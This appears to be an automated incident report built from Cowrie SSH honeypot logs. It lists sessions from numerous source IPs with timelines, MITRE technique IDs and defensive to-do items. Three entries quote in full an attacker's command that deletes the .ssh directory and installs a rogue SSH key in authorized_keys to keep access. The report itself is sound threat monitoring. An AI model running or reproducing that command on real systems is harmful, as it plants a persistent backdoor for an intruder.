### 🔴 HIGH · IR-af3369773ae2

| Field | Detail |
|---|---|
| **Source IP** | `196.216.81[.]126` |
| **First Seen** | 2026-07-20 21:24 |
| **Last Seen** | 2026-07-20 21:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:24:53` | `cowrie.session.connect` |
| `2026-07-20 21:24:53` | `cowrie.client.version` |
| `2026-07-20 21:24:53` | `cowrie.client.kex` |
| `2026-07-20 21:24:55` | `cowrie.login.success` |
| `2026-07-20 21:24:56` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:25:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.216.81[.]126` to AbuseIPDB if not already reported
- [ ] Block `196.216.81[.]126` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fd6d3da5f5a

| Field | Detail |
|---|---|
| **Source IP** | `50.187.155[.]130` |
| **First Seen** | 2026-07-20 21:27 |
| **Last Seen** | 2026-07-20 21:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:27:26` | `cowrie.session.connect` |
| `2026-07-20 21:27:26` | `cowrie.client.version` |
| `2026-07-20 21:27:26` | `cowrie.client.kex` |
| `2026-07-20 21:27:28` | `cowrie.login.success` |
| `2026-07-20 21:27:30` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:27:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.187.155[.]130` to AbuseIPDB if not already reported
- [ ] Block `50.187.155[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cdb05d0c5ce

| Field | Detail |
|---|---|
| **Source IP** | `112.94.5[.]43` |
| **First Seen** | 2026-07-20 21:27 |
| **Last Seen** | 2026-07-20 21:27 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:27:35` | `cowrie.session.connect` |
| `2026-07-20 21:27:36` | `cowrie.client.version` |
| `2026-07-20 21:27:36` | `cowrie.client.kex` |
| `2026-07-20 21:27:38` | `cowrie.login.success` |
| `2026-07-20 21:27:39` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:27:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.94.5[.]43` to AbuseIPDB if not already reported
- [ ] Block `112.94.5[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb720878ba27

| Field | Detail |
|---|---|
| **Source IP** | `121.22.99[.]2` |
| **First Seen** | 2026-07-20 21:27 |
| **Last Seen** | 2026-07-20 21:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:27:59` | `cowrie.session.connect` |
| `2026-07-20 21:28:00` | `cowrie.client.version` |
| `2026-07-20 21:28:00` | `cowrie.client.kex` |
| `2026-07-20 21:28:02` | `cowrie.login.success` |
| `2026-07-20 21:28:03` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:28:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.22.99[.]2` to AbuseIPDB if not already reported
- [ ] Block `121.22.99[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e266f48f26e3

| Field | Detail |
|---|---|
| **Source IP** | `65.20.251[.]41` |
| **First Seen** | 2026-07-20 21:28 |
| **Last Seen** | 2026-07-20 21:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:28:13` | `cowrie.session.connect` |
| `2026-07-20 21:28:14` | `cowrie.client.version` |
| `2026-07-20 21:28:14` | `cowrie.client.kex` |
| `2026-07-20 21:28:15` | `cowrie.login.success` |
| `2026-07-20 21:28:16` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:28:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.251[.]41` to AbuseIPDB if not already reported
- [ ] Block `65.20.251[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71ea3ed7e16d

| Field | Detail |
|---|---|
| **Source IP** | `122.117.30[.]20` |
| **First Seen** | 2026-07-20 21:28 |
| **Last Seen** | 2026-07-20 21:28 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:28:21` | `cowrie.session.connect` |
| `2026-07-20 21:28:22` | `cowrie.client.version` |
| `2026-07-20 21:28:22` | `cowrie.client.kex` |
| `2026-07-20 21:28:24` | `cowrie.login.success` |
| `2026-07-20 21:28:25` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:28:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.117.30[.]20` to AbuseIPDB if not already reported
- [ ] Block `122.117.30[.]20` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c37e4a005719

| Field | Detail |
|---|---|
| **Source IP** | `31.173.0[.]46` |
| **First Seen** | 2026-07-20 21:31 |
| **Last Seen** | 2026-07-20 21:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:31:27` | `cowrie.session.connect` |
| `2026-07-20 21:31:28` | `cowrie.client.version` |
| `2026-07-20 21:31:28` | `cowrie.client.kex` |
| `2026-07-20 21:31:30` | `cowrie.login.success` |
| `2026-07-20 21:31:31` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:31:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.0[.]46` to AbuseIPDB if not already reported
- [ ] Block `31.173.0[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52f3053c98c6

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-20 21:31 |
| **Last Seen** | 2026-07-20 21:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:31:53` | `cowrie.session.connect` |
| `2026-07-20 21:31:53` | `cowrie.client.version` |
| `2026-07-20 21:31:53` | `cowrie.client.kex` |
| `2026-07-20 21:31:55` | `cowrie.login.success` |
| `2026-07-20 21:31:56` | `cowrie.session.params` |
| `2026-07-20 21:31:56` | `cowrie.command.input` |
| `2026-07-20 21:31:56` | `cowrie.log.closed` |
| `2026-07-20 21:31:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3091f71f579

| Field | Detail |
|---|---|
| **Source IP** | `34.146.217[.]105` |
| **First Seen** | 2026-07-20 21:38 |
| **Last Seen** | 2026-07-20 21:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:38:46` | `cowrie.session.connect` |
| `2026-07-20 21:38:47` | `cowrie.client.version` |
| `2026-07-20 21:38:47` | `cowrie.client.kex` |
| `2026-07-20 21:38:48` | `cowrie.login.success` |
| `2026-07-20 21:38:49` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:38:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.146.217[.]105` to AbuseIPDB if not already reported
- [ ] Block `34.146.217[.]105` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43d4748e676b

| Field | Detail |
|---|---|
| **Source IP** | `116.135.67[.]93` |
| **First Seen** | 2026-07-20 21:40 |
| **Last Seen** | 2026-07-20 21:45 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:40:10` | `cowrie.session.connect` |
| `2026-07-20 21:40:10` | `cowrie.client.version` |
| `2026-07-20 21:40:11` | `cowrie.client.kex` |
| `2026-07-20 21:40:12` | `cowrie.login.success` |
| `2026-07-20 21:40:13` | `cowrie.session.params` |
| `2026-07-20 21:40:13` | `cowrie.command.input` |
| `2026-07-20 21:40:13` | `cowrie.command.failed` |
| `2026-07-20 21:40:13` | `cowrie.log.closed` |
| `2026-07-20 21:40:14` | `cowrie.session.params` |
| `2026-07-20 21:40:14` | `cowrie.command.input` |
| `2026-07-20 21:40:14` | `cowrie.session.file_download` |
| `2026-07-20 21:40:14` | `cowrie.log.closed` |
| `2026-07-20 21:45:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.135.67[.]93` to AbuseIPDB if not already reported
- [ ] Block `116.135.67[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a45fcd2c61a1

| Field | Detail |
|---|---|
| **Source IP** | `116.135.67[.]93` |
| **First Seen** | 2026-07-20 21:40 |
| **Last Seen** | 2026-07-20 21:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:40:15` | `cowrie.session.connect` |
| `2026-07-20 21:40:15` | `cowrie.client.version` |
| `2026-07-20 21:40:15` | `cowrie.client.kex` |
| `2026-07-20 21:40:16` | `cowrie.login.success` |
| `2026-07-20 21:40:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.135.67[.]93` to AbuseIPDB if not already reported
- [ ] Block `116.135.67[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-899e10e7e3e8

| Field | Detail |
|---|---|
| **Source IP** | `176.31.21[.]38` |
| **First Seen** | 2026-07-20 21:41 |
| **Last Seen** | 2026-07-20 21:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:41:53` | `cowrie.session.connect` |
| `2026-07-20 21:41:53` | `cowrie.client.version` |
| `2026-07-20 21:41:53` | `cowrie.client.kex` |
| `2026-07-20 21:41:53` | `cowrie.login.success` |
| `2026-07-20 21:41:54` | `cowrie.session.params` |
| `2026-07-20 21:41:54` | `cowrie.command.input` |
| `2026-07-20 21:41:54` | `cowrie.command.failed` |
| `2026-07-20 21:41:54` | `cowrie.log.closed` |
| `2026-07-20 21:41:55` | `cowrie.session.params` |
| `2026-07-20 21:41:55` | `cowrie.command.input` |
| `2026-07-20 21:41:55` | `cowrie.session.file_download` |
| `2026-07-20 21:41:55` | `cowrie.log.closed` |
| `2026-07-20 21:41:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.31.21[.]38` to AbuseIPDB if not already reported
- [ ] Block `176.31.21[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3a806d3e8bf

| Field | Detail |
|---|---|
| **Source IP** | `176.31.21[.]38` |
| **First Seen** | 2026-07-20 21:41 |
| **Last Seen** | 2026-07-20 21:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:41:55` | `cowrie.session.connect` |
| `2026-07-20 21:41:55` | `cowrie.client.version` |
| `2026-07-20 21:41:55` | `cowrie.client.kex` |
| `2026-07-20 21:41:56` | `cowrie.login.success` |
| `2026-07-20 21:41:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.31.21[.]38` to AbuseIPDB if not already reported
- [ ] Block `176.31.21[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28a6f40d7cce

| Field | Detail |
|---|---|
| **Source IP** | `176.31.21[.]38` |
| **First Seen** | 2026-07-20 21:41 |
| **Last Seen** | 2026-07-20 21:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:41:56` | `cowrie.session.connect` |
| `2026-07-20 21:41:56` | `cowrie.client.version` |
| `2026-07-20 21:41:56` | `cowrie.client.kex` |
| `2026-07-20 21:41:56` | `cowrie.login.success` |
| `2026-07-20 21:41:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.31.21[.]38` to AbuseIPDB if not already reported
- [ ] Block `176.31.21[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81ea9e044842

| Field | Detail |
|---|---|
| **Source IP** | `221.182.185[.]190` |
| **First Seen** | 2026-07-20 21:41 |
| **Last Seen** | 2026-07-20 21:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:41:58` | `cowrie.session.connect` |
| `2026-07-20 21:41:59` | `cowrie.client.version` |
| `2026-07-20 21:41:59` | `cowrie.client.kex` |
| `2026-07-20 21:42:01` | `cowrie.login.success` |
| `2026-07-20 21:42:02` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:42:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.182.185[.]190` to AbuseIPDB if not already reported
- [ ] Block `221.182.185[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b65a177a2470

| Field | Detail |
|---|---|
| **Source IP** | `112.161.26[.]125` |
| **First Seen** | 2026-07-20 21:42 |
| **Last Seen** | 2026-07-20 21:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:42:12` | `cowrie.session.connect` |
| `2026-07-20 21:42:13` | `cowrie.client.version` |
| `2026-07-20 21:42:13` | `cowrie.client.kex` |
| `2026-07-20 21:42:15` | `cowrie.login.success` |
| `2026-07-20 21:42:15` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:42:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.161.26[.]125` to AbuseIPDB if not already reported
- [ ] Block `112.161.26[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0c19f3600d0

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-20 21:44 |
| **Last Seen** | 2026-07-20 21:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:44:06` | `cowrie.session.connect` |
| `2026-07-20 21:44:06` | `cowrie.client.version` |
| `2026-07-20 21:44:06` | `cowrie.client.kex` |
| `2026-07-20 21:44:06` | `cowrie.login.success` |
| `2026-07-20 21:44:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3513ae05bdb

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-20 21:44 |
| **Last Seen** | 2026-07-20 21:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:44:06` | `cowrie.session.connect` |
| `2026-07-20 21:44:06` | `cowrie.client.version` |
| `2026-07-20 21:44:06` | `cowrie.client.kex` |
| `2026-07-20 21:44:06` | `cowrie.login.success` |
| `2026-07-20 21:44:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d62126036a79

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-20 21:44 |
| **Last Seen** | 2026-07-20 21:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:44:15` | `cowrie.session.connect` |
| `2026-07-20 21:44:15` | `cowrie.client.version` |
| `2026-07-20 21:44:15` | `cowrie.client.kex` |
| `2026-07-20 21:44:15` | `cowrie.login.success` |
| `2026-07-20 21:44:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69fe817fbd87

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-20 21:44 |
| **Last Seen** | 2026-07-20 21:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:44:15` | `cowrie.session.connect` |
| `2026-07-20 21:44:15` | `cowrie.client.version` |
| `2026-07-20 21:44:15` | `cowrie.client.kex` |
| `2026-07-20 21:44:15` | `cowrie.login.success` |
| `2026-07-20 21:44:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ab4702768c3

| Field | Detail |
|---|---|
| **Source IP** | `85.198.19[.]242` |
| **First Seen** | 2026-07-20 21:46 |
| **Last Seen** | 2026-07-20 21:46 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:46:05` | `cowrie.session.connect` |
| `2026-07-20 21:46:05` | `cowrie.client.version` |
| `2026-07-20 21:46:05` | `cowrie.client.kex` |
| `2026-07-20 21:46:07` | `cowrie.login.success` |
| `2026-07-20 21:46:10` | `cowrie.session.params` |
| `2026-07-20 21:46:10` | `cowrie.command.input` |
| `2026-07-20 21:46:10` | `cowrie.command.failed` |
| `2026-07-20 21:46:11` | `cowrie.log.closed` |
| `2026-07-20 21:46:12` | `cowrie.session.params` |
| `2026-07-20 21:46:12` | `cowrie.command.input` |
| `2026-07-20 21:46:12` | `cowrie.session.file_download` |
| `2026-07-20 21:46:12` | `cowrie.log.closed` |
| `2026-07-20 21:46:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.198.19[.]242` to AbuseIPDB if not already reported
- [ ] Block `85.198.19[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a881a2aa3bb7

| Field | Detail |
|---|---|
| **Source IP** | `85.198.19[.]242` |
| **First Seen** | 2026-07-20 21:46 |
| **Last Seen** | 2026-07-20 21:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:46:12` | `cowrie.session.connect` |
| `2026-07-20 21:46:12` | `cowrie.client.version` |
| `2026-07-20 21:46:13` | `cowrie.client.kex` |
| `2026-07-20 21:46:14` | `cowrie.login.success` |
| `2026-07-20 21:46:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.198.19[.]242` to AbuseIPDB if not already reported
- [ ] Block `85.198.19[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f59338acf2de

| Field | Detail |
|---|---|
| **Source IP** | `85.198.19[.]242` |
| **First Seen** | 2026-07-20 21:46 |
| **Last Seen** | 2026-07-20 21:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:46:15` | `cowrie.session.connect` |
| `2026-07-20 21:46:15` | `cowrie.client.version` |
| `2026-07-20 21:46:16` | `cowrie.client.kex` |
| `2026-07-20 21:46:17` | `cowrie.login.success` |
| `2026-07-20 21:46:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.198.19[.]242` to AbuseIPDB if not already reported
- [ ] Block `85.198.19[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ff188217f74

| Field | Detail |
|---|---|
| **Source IP** | `43.157.248[.]241` |
| **First Seen** | 2026-07-20 21:47 |
| **Last Seen** | 2026-07-20 21:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
